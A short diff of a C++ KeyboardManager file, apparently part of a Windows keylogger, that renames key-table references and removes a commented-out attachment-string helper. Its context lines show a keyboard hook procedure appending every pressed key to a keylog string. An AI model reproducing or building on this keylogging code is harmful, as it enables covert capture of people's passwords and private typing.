@@ -11,16 +11,6 @@
 
 #include "KeyboardManager.h"
 
-// std::string GenerateAttatchmentString(const std::vector<std::string>& attatchments)
-// {
-// 	std::string ret = "";
-// 	for (std::vector<std::string>::size_type i = 0; i != attatchments.size(); ++i) {
-// 		ret += attatchments[i] + ((i + 1 == attatchments.size()) ? "" : "::");
-// 	}
-
-// 	return ret;
-// }
-
 // KeyboardManager constructor
 KeyboardManager::KeyboardManager()
 	: eHook(NULL)
@@ -36,7 +26,7 @@ LRESULT KeyboardManager::KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
 	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
 	{
-		keylog += Keys::KEYS[kbs->vkCode].Name;
+		keylog += KEYS[kbs->vkCode].Name;
 		if (kbs->vkCode == VK_RETURN)
 			keylog += '\n';
 	}
@@ -57,7 +47,7 @@ LRESULT KeyboardManager::KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 			|| key == VK_LWIN
 			|| key == VK_RWIN)
 		{
-			std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
+			std::string KeyName = KEYS[kbs->vkCode].Name;
 			KeyName.insert(1, "/");
 			keylog += KeyName;
 		}
